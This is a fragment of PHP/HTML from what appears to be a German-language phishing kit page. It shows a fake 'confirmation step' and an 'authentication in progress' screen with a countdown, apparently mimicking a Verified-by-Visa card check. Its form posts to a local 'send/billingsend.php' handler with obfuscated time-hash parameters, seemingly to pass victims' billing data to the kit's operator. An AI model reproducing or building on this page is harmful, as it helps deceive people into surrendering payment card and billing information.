                    ...
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/billingsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">BESTÄTIGUNGSSCHRITT</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Authentifizierung läuft...</h3>
                                ...
                                <div>
                                    <center>
                                        <label>Weiterleitung in <span id="countdowntimer"><?php echo $vbvtimer?></span> Sekunden</label>
                                    </center>
                                </div>
                            </form>
                        </div>
